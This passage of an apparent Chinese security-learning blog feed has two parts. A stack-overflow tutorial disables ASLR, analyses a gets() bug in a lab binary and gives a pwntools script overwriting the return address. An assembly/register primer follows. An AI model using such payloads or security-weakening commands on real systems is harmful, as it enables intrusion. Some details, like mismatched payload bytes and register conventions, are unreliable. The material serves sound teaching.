平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p><ul><li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li><li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li><li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li></ul><p>我们可以使用 <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code> 关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p><p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x08049176。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08049176 success         proc near</span><br><span class="line">.text:08049176</span><br><span class="line">.text:08049176 var_4           = dword ptr -4</span><br><span class="line">.text:08049176</span><br><span class="line">.text:08049176 ; __unwind &#123;</span><br><span class="line">.text:08049176                 push    ebp</span><br><span class="line">.text:08049177                 mov     ebp, esp</span><br><span class="line">.text:08049179                 push    ebx</span><br><span class="line">.text:0804917A                 sub     esp, 4</span><br><span class="line">.text:0804917D                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08049182                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:08049187                 sub     esp, 0Ch</span><br><span class="line">.text:0804918A                 lea     edx, (aYouHavaAlready - 804BFF4h)[eax] ; &quot;You Hava already controlled it.&quot;</span><br><span class="line">.text:08049190                 push    edx             ; s</span><br><span class="line">.text:08049191                 mov     ebx, eax</span><br><span class="line">.text:08049193                 call    _puts</span><br><span class="line">.text:08049198                 add     esp, 10h</span><br><span class="line">.text:0804919B                 nop</span><br><span class="line">.text:0804919C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:0804919F                 leave</span><br><span class="line">.text:080491A0                 retn</span><br><span class="line">.text:080491A0 ; &#125; // starts at 8049176</span><br><span class="line">.text:080491A0 success         endp</span><br></pre></td></tr></table></figure><p>那么如果我们读取的字符串为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x14*&#x27;a&#x27;+&#x27;bbbb&#x27;+success_addr</span><br></pre></td></tr></table></figure><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x08049176   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x08049176在内存中的形式是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x76\x91\x04\x08</span><br></pre></td></tr></table></figure><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x76 作为一个字符输入进去。这里利用 pwntools 的代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x08049176</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span>(p32(success_addr))</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行一波代码，可以得到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./stack_example&#x27;</span>: pid 70</span><br><span class="line">b<span class="string">&#x27;\x86\x91\x04\x08&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb\x86\x91\x04\x08</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 61936)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>可以看到我们确实已经执行 success 函数。</p><h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p><h2 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h2><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h2 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h2><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="5-栈溢出与ROP" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/"/>
    
    <category term="Stack Overflow" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/"/>
    
    <category term="x86x64" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/"/>
    
    
  </entry>
  
  <entry>
    <title>装载与汇编</title>
    <link href="https://rhea006.github.io/2025/06/80115e1b9881.html"/>
    <id>https://rhea006.github.io/2025/06/80115e1b9881.html</id>
    <published>2025-06-30T12:16:36.000Z</published>
    <updated>2025-07-01T03:18:46.839Z</updated>
    
    <content type="html"><![CDATA[<h1 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h1><p><img src="/../../../../../images/image-20250630141153683.png" alt="image-20250630141153683"></p><p><img src="/../../../../../images/image-20250630140857482.png" alt="image-20250630140857482"></p><p><img src="/../../../../../images/image-20250630141427878.png" alt="image-20250630141427878"></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="两种语法风格"><a href="#两种语法风格" class="headerlink" title="两种语法风格"></a>两种语法风格</h2><table><thead><tr><th>功能 &#x2F; 场景</th><th>Intel 汇编格式</th><th>AT&amp;T 汇编格式</th></tr></thead><tbody><tr><td><strong>立即数传送到寄存器</strong></td><td><code>mov eax, 8</code></td><td><code>movl $8, %eax</code></td></tr><tr><td><strong>带十六进制立即数的传送</strong></td><td><code>mov ebx, 0ffffh</code></td><td><code>movl $0xffff, %ebx</code></td></tr><tr><td><strong>触发系统调用（中断）</strong></td><td><code>int 80h</code></td><td><code>int $0x80</code></td></tr><tr><td><strong>内存数据传送到寄存器</strong></td><td><code>mov eax, [ecx]</code></td><td><code>movl (%ecx), %eax</code></td></tr><tr><td><strong>函数 &#x2F; 过程（sum 示例）</strong></td><td>sum:<br/>push ebp<br/>mov ebp, esp<br/>mov eax, [ebp+12]<br/>add eax, [ebp+8]<br/>pop ebp<br/>retn<br/></td><td>sum:<br/>pushl %ebp<br/>movl %esp, %ebp<br/>movl 12(%ebp), %eax<br/>addl 8(%ebp), %eax<br/>popl %ebp<br/>ret<br/></td></tr></tbody></table><h2 id="寄存器与数据类型"><a href="#寄存器与数据类型" class="headerlink" title="寄存器与数据类型"></a>寄存器与数据类型</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><table><thead><tr><th align="left"><strong>寄存器</strong></th><th align="left"><strong>位数</strong></th><th align="left"><strong>主要功能</strong></th><th align="left"><strong>特殊用途</strong></th><th align="left"><strong>子寄存器关系</strong></th></tr></thead><tbody><tr><td align="left"><strong>RAX</strong></td><td align="left">64-bit</td><td align="left">函数返回值、算术运算</td><td align="left">系统调用号(Syscall)</td><td align="left">RAX → EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>EAX</strong></td><td align="left">32-bit</td><td align="left">累加器、算术运算主存器</td><td align="left">乘法&#x2F;除法结果存储</td><td align="left">EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>AX</strong></td><td align="left">16-bit</td><td align="left">字乘法&#x2F;字除法&#x2F;字I&#x2F;O</td><td align="left">-</td><td align="left">AX → AH(高8位)&#x2F;AL(低8位)</td></tr><tr><td align="left"><strong>AL</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法&#x2F;字节I&#x2F;O 十进制运算</td><td align="left">BCD运算</td><td align="left">AX的低字节</td></tr><tr><td align="left"><strong>AH</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法</td><td align="left">-</td><td align="left">AX的高字节</td></tr><tr><td align="left"><strong>RBX</strong></td><td align="left">64-bit</td><td align="left">通用数据存储</td><td align="left">内存寻址基址</td><td align="left">RBX → EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>EBX</strong></td><td align="left">32-bit</td><td align="left">内存寻址基址</td><td align="left">-</td><td align="left">EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>BX</strong></td><td align="left">16-bit</td><td align="left">内存指针</td><td align="left">段寄存器(DS)的默认基址</td><td align="left">BX → BH(高8位)&#x2F;BL(低8位)</td></tr><tr><td align="left"><strong>RCX</strong></td><td align="left">64-bit</td><td align="left">循环计数器</td><td align="left">REP前缀指令计数</td><td align="left">RCX → ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>ECX</strong></td><td align="left">32-bit</td><td align="left">循环计数器</td><td align="left">-</td><td align="left">ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>CX</strong></td><td align="left">16-bit</td><td align="left">串操作&#x2F;循环控制</td><td align="left">-</td><td align="left">CX → CH(高8位)&#x2F;CL(低8位)</td></tr><tr><td align="left"><strong>CL</strong></td><td align="left">8-bit</td><td align="left">移位&#x2F;旋转计数器</td><td align="left">位操作指令</td><td align="left">CX的低字节</td></tr><tr><td align="left"><strong>RDX</strong></td><td align="left">64-bit</td><td align="left">I&#x2F;O指针、数据存储</td><td align="left">除法余数存储</td><td align="left">RDX → EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>EDX</strong></td><td align="left">32-bit</td><td align="left">字乘法&#x2F;字除法 间接I&#x2F;O</td><td align="left">除法余数</td><td align="left">EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>DX</strong></td><td align="left">16-bit</td><td align="left">端口地址指针</td><td align="left">-</td><td align="left">DX → DH(高8位)&#x2F;DL(低8位)</td></tr><tr><td align="left"><strong>RSI</strong></td><td align="left">64-bit</td><td align="left">内存源指针</td><td align="left">串操作源地址</td><td align="left">RSI → ESI → SI</td></tr><tr><td align="left"><strong>ESI</strong></td><td align="left">32-bit</td><td align="left">内存源指针</td><td align="left">LODS&#x2F;MOVS等指令</td><td align="left">ESI → SI</td></tr><tr><td align="left"><strong>SI</strong></td><td align="left">16-bit</td><td align="left">串操作源指针</td><td align="left">DS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RDI</strong></td><td align="left">64-bit</td><td align="left">内存目的指针</td><td align="left">串操作目的地址</td><td align="left">RDI → EDI → DI</td></tr><tr><td align="left"><strong>EDI</strong></td><td align="left">32-bit</td><td align="left">内存目的指针</td><td align="left">STOS&#x2F;MOVS等指令</td><td align="left">EDI → DI</td></tr><tr><td align="left"><strong>DI</strong></td><td align="left">16-bit</td><td align="left">串操作目的指针</td><td align="left">ES段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RBP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">访问栈帧参数&#x2F;局部变量</td><td align="left">RBP → EBP → BP</td></tr><tr><td align="left"><strong>EBP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">函数栈帧基准</td><td align="left">EBP → BP</td></tr><tr><td align="left"><strong>BP</strong></td><td align="left">16-bit</td><td align="left">栈数据访问指针</td><td align="left">SS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RSP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">当前栈顶位置</td><td align="left">RSP → ESP → SP</td></tr><tr><td align="left"><strong>ESP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">PUSH&#x2F;POP操作</td><td align="left">ESP → SP</td></tr><tr><td align="left"><strong>SP</strong></td><td align="left">16-bit</td><td align="left">栈顶指针</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><strong>RIP</strong></td><td align="left">64-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">存放下一条指令地址</td><td align="left">RIP → EIP → IP</td></tr><tr><td align="left"><strong>EIP</strong></td><td align="left">32-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">控制程序执行流程</td><td align="left">EIP → IP</td></tr><tr><td align="left"><strong>IP</strong></td><td align="left">16-bit</td><td align="left">指令指针</td><td align="left">实模式下使用</td><td align="left">-</td></tr></tbody></table><h4 id="关键补充说明："><a href="#关键补充说明：" class="headerlink" title="关键补充说明："></a>关键补充说明：</h4><h5 id="寄存器层级关系："><a href="#寄存器层级关系：" class="headerlink" title="寄存器层级关系："></a>寄存器层级关系：</h5><ul><li>64位寄存器 (R开头)：<code>RAX</code>, <code>RBX</code>, <code>RCX</code>, <code>RDX</code>, <code>RSI</code>, <code>RDI</code>, <code>RBP</code>, <code>RSP</code>, <code>RIP</code></li><li>32位寄存器 (E开头)：<code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code>, <code>ESI</code>, <code>EDI</code>, <code>EBP</code>, <code>ESP</code>, <code>EIP</code></li><li>16位寄存器：<code>AX</code>, <code>BX</code>, <code>CX</code>, <code>DX</code>, <code>SI</code>, <code>DI</code>, <code>BP</code>, <code>SP</code>, <code>IP</code></li><li>8位寄存器：<code>AH</code>&#x2F;<code>AL</code>, <code>BH</code>&#x2F;<code>BL</code>, <code>CH</code>&#x2F;<code>CL</code>, <code>DH</code>&#x2F;<code>DL</code></li></ul><h5 id="Pwn-逆向中的核心寄存器："><a href="#Pwn-逆向中的核心寄存器：" class="headerlink" title="Pwn&#x2F;逆向中的核心寄存器："></a>Pwn&#x2F;逆向中的核心寄存器：</h5><ul><li><strong>RIP&#x2F;EIP</strong>：控制程序执行流（劫持核心目标）</li><li><strong>RSP&#x2F;ESP</strong>：栈指针（缓冲区溢出关键）</li><li><strong>RBP&#x2F;EBP</strong>：栈帧基准（定位局部变量&#x2F;参数）</li><li><strong>RAX&#x2F;EAX</strong>：存储系统调用号和函数返回值</li></ul><h5 id="特殊功能寄存器："><a href="#特殊功能寄存器：" class="headerlink" title="特殊功能寄存器："></a>特殊功能寄存器：</h5><ul><li><strong>段寄存器</strong>：CS（代码段）, DS（数据段）, SS（堆栈段）, ES&#x2F;FS&#x2F;GS（附加段）</li><li><strong>标志寄存器</strong>：EFLAGS&#x2F;RFLAGS（存储状态标志如ZF&#x2F;CF&#x2F;SF等）</li></ul><h5 id="寄存器使用场景："><a href="#寄存器使用场景：" class="headerlink" title="寄存器使用场景："></a>寄存器使用场景：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#函数调用示例</span><br><span class="line">push rbp            ; 保存调用者栈帧</span><br><span class="line">mov rbp, rsp        ; 建立新栈帧</span><br><span class="line">mov eax, [rbp+8]    ; 获取第一个参数</span><br><span class="line">add eax, [rbp+12]   ; 加上第二个参数</span><br><span class="line">pop rbp             ; 恢复栈帧</span><br><span class="line">ret                 ; 返回到RIP指向地址</span><br></pre></td></tr></table></figure><h5 id="64位与32位差异："><a href="#64位与32位差异：" class="headerlink" title="64位与32位差异："></a>64位与32位差异：</h5><ul><li>64位新增寄存器：R8-R15</li><li>调用约定变更：64位使用RCX&#x2F;RDX&#x2F;R8&#x2F;R9传参</li><li>内存寻址范围扩大：64位支持48位虚拟地址空间</li></ul><h5 id="栈帧："><a href="#栈帧：" class="headerlink" title="栈帧："></a>栈帧：</h5><p>一个栈帧就是保存一个函数的状态，简单来说就是一个函数所需要的栈空间.</p><p>rsp(栈顶寄存器) &#x2F;esp(栈指针寄存器)永远指向栈帧的栈顶，rbp(栈基寄存器)&#x2F;ebp(扩展基址指针寄存器)则永远指向栈帧的栈底,rip(程序计数寄存器)&#x2F;eip(指令指针寄存器)指向当前栈栈帧执行的命令。</p><p>栈从高地址向低地址开辟内存空间，所以低地址的是栈顶，而栈底的第一个栈帧在这里存放着我们的主函数的父函数，所以main函数并不是最栈顶的函数，main上面还会在编译过程中有一些库函数，但是他们并不会产生栈帧，因为栈先进后出的特性，所以当在main函数中需要调用其他函数时，就开辟一个新的函数栈帧，并存储上一个栈的栈底，当调用结束时，将现在的栈帧弹出，恢复到原来的main函数继续执行完main函数。</p><p><img src="/../../../../../images/image-20250630161338940.png" alt="image-20250630161338940"></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h4><h5 id="表达方式："><a href="#表达方式：" class="headerlink" title="表达方式："></a>表达方式：</h5><table><thead><tr><th align="left"><strong>进制</strong></th><th align="left"><strong>前缀</strong></th><th align="left"><strong>示例</strong></th><th align="left">汇编表示</th></tr></thead><tbody><tr><td align="left"><strong>十进制</strong></td><td align="left">无</td><td align="left"><code>12345</code></td><td align="left"><code>mov eax, 12345</code></td></tr><tr><td align="left"><strong>十六进制</strong></td><td align="left"><code>0x</code></td><td align="left"><code>0xDEADBEEF</code></td><td align="left"><code>mov ebx, 0xDEADBEEF</code></td></tr><tr><td align="left"><strong>八进制</strong></td><td align="left"><code>0</code></td><td align="left"><code>0755</code></td><td align="left"><code>mov ecx, 0755</code></td></tr><tr><td align="left"><strong>二进制</strong></td><td align="left"><code>0b</code></td><td align="left"><code>0b10101010</code></td><td align="left"><code>mov dl, 0b10101010</code></td></tr></tbody></table><h5 id="内存存储（小端序）："><a href="#内存存储（小端序）：" class="headerlink" title="内存存储（小端序）："></a>内存存储（小端序）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">0x12345678</span>;  <span class="comment">// 32位整数</span></span><br><span class="line"><span class="comment">// 内存布局（地址递增）：</span></span><br><span class="line">Address: <span class="number">0x1000</span> → <span class="number">0x78</span></span><br><span class="line">Address: <span class="number">0x1001</span> → <span class="number">0x56</span></span><br><span class="line">Address: <span class="number">0x1002</span> → <span class="number">0x34</span></span><br><span class="line">Address: <span class="number">0x1003</span> → <span class="number">0x12</span></span><br></pre></td></tr></table></figure><h4 id="浮点数常量"><a href="#浮点数常量" class="headerlink" title="浮点数常量"></a>浮点数常量</h4><h5 id="IEEE-754标准："><a href="#IEEE-754标准：" class="headerlink" title="IEEE 754标准："></a>IEEE 754标准：</h5><table><thead><tr><th align="left"><strong>类型</strong></th><th align="left"><strong>总位数</strong></th><th align="left"><strong>符号位</strong></th><th align="left"><strong>指数位</strong></th><th align="left"><strong>尾数位</strong></th><th align="left"><strong>范围</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left"><strong>float</strong></td><td align="left">32-bit</td><td align="left">1 bit</td><td align="left">8 bits</td><td align="left">23 bits</td><td align="left">±3.4e38</td><td align="left"><code>3.14f</code></td></tr><tr><td align="left"><strong>double</strong></td><td align="left">64-bit</td><td align="left">1 bit</td><td align="left">11 bits</td><td align="left">52 bits</td><td align="left">±1.7e308</td><td align="left"><code>2.71828</code></td></tr></tbody></table><h5 id="内存布局（float示例）："><a href="#内存布局（float示例）：" class="headerlink" title="内存布局（float示例）："></a>内存布局（float示例）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> pi = <span class="number">3.14159</span>;  <span class="comment">// 十六进制: 0x40490FD0</span></span><br><span class="line"><span class="comment">// 内存结构（小端序）：</span></span><br><span class="line"><span class="number">0x0000</span>: D0  <span class="comment">// 尾数低位</span></span><br><span class="line"><span class="number">0x0001</span>: <span class="number">0F</span>  </span><br><span class="line"><span class="number">0x0002</span>: <span class="number">49</span>  <span class="comment">// 尾数高位 + 指数低位</span></span><br><span class="line"><span class="number">0x0003</span>: <span class="number">40</span>  <span class="comment">// 符号(0) + 指数高位</span></span><br></pre></td></tr></table></figure><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><h5 id="内存表示："><a href="#内存表示：" class="headerlink" title="内存表示："></a>内存表示：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *str = <span class="string">&quot;Hello Pwn!&quot;</span>; </span><br><span class="line"><span class="comment">// 内存布局：</span></span><br><span class="line">Address: <span class="number">0x4000</span> → <span class="string">&#x27;H&#x27;</span> (<span class="number">0x48</span>)</span><br><span class="line">Address: <span class="number">0x4001</span> → <span class="string">&#x27;e&#x27;</span> (<span class="number">0x65</span>)</span><br><span class="line">...</span><br><span class="line">Address: <span class="number">0x4009</span> → <span class="string">&#x27;!&#x27;</span> (<span class="number">0x21</span>)</span><br><span class="line">Address: <span class="number">0x400A</span> → <span class="number">0x00</span>  <span class="comment">// NULL终止符</span></span><br></pre></td></tr></table></figure><h5 id="汇编定义："><a href="#汇编定义：" class="headerlink" title="汇编定义："></a>汇编定义：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &#x27;Hello Pwn!&#x27;, 0x0A, 0  ; 带换行符的字符串</span><br><span class="line">section .text</span><br><span class="line">    mov rsi, msg   ; 字符串地址 → RSI</span><br><span class="line">    mov rdx, 11    ; 长度(包括换行)</span><br><span class="line">    syscall        ; Linux写系统调用</span><br></pre></td></tr></table></figure><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>·进位标志CF(Carry Flag):</strong><br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高 位产生了一个进位或借位，那么，其值为1，否则其值为0。<br><strong>·奇偶标志PF(Parity Flag):</strong><br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br><strong>·辅助进位标志AF(Auxiliary Carry Flag)：</strong><br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0(在字操作时，发生低字节向高字节进位或借位时；在字节操作时，发生低4位向高4位进位或借位时)。<br><strong>·零标志ZF(ZeroFlag):</strong><br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br><strong>·符号标志SF(Sign Flag):</strong><br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br><strong>·溢出标志OF(Overflow Flag):</strong><br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 </p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h3 id="常用指令表"><a href="#常用指令表" class="headerlink" title="常用指令表"></a>常用指令表</h3><table><thead><tr><th align="left"><strong>指令类型</strong></th><th align="left"><strong>指令</strong></th><th align="left"><strong>语法</strong></th><th align="left"><strong>功能描述</strong></th><th align="left"><strong>标志位影响</strong></th><th align="left"><strong>Pwn应用场景</strong></th></tr></thead><tbody><tr><td align="left"><strong>数据传送</strong></td><td align="left"><code>MOV</code></td><td align="left"><code>MOV 目标, 源</code></td><td align="left">将源操作数复制到目标</td><td align="left"><strong>无影响</strong></td><td align="left">构造ROP链、寄存器控制</td></tr><tr><td align="left"></td><td align="left"><code>LEA</code></td><td align="left"><code>LEA 目标, [内存]</code></td><td align="left">加载有效地址（不访问内存）</td><td align="left"><strong>无影响</strong></td><td align="left">计算地址绕过ASLR</td></tr><tr><td align="left"><strong>算术运算</strong></td><td align="left"><code>ADD</code></td><td align="left"><code>ADD 目标, 源</code></td><td align="left">目标 &#x3D; 目标 + 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">整数溢出漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>SUB</code></td><td align="left"><code>SUB 目标, 源</code></td><td align="left">目标 &#x3D; 目标 - 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">内存地址计算</td></tr><tr><td align="left"></td><td align="left"><code>INC</code></td><td align="left"><code>INC 目标</code></td><td align="left">目标 &#x3D; 目标 + 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">计数器修改</td></tr><tr><td align="left"></td><td align="left"><code>DEC</code></td><td align="left"><code>DEC 目标</code></td><td align="left">目标 &#x3D; 目标 - 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">循环控制</td></tr><tr><td align="left"><strong>逻辑运算</strong></td><td align="left"><code>AND</code></td><td align="left"><code>AND 目标, 源</code></td><td align="left">目标 &#x3D; 目标 &amp; 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位掩码操作</td></tr><tr><td align="left"></td><td align="left"><code>OR</code></td><td align="left"><code>OR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 | 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位设置</td></tr><tr><td align="left"></td><td align="left"><code>XOR</code></td><td align="left"><code>XOR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 ^ 源</td><td 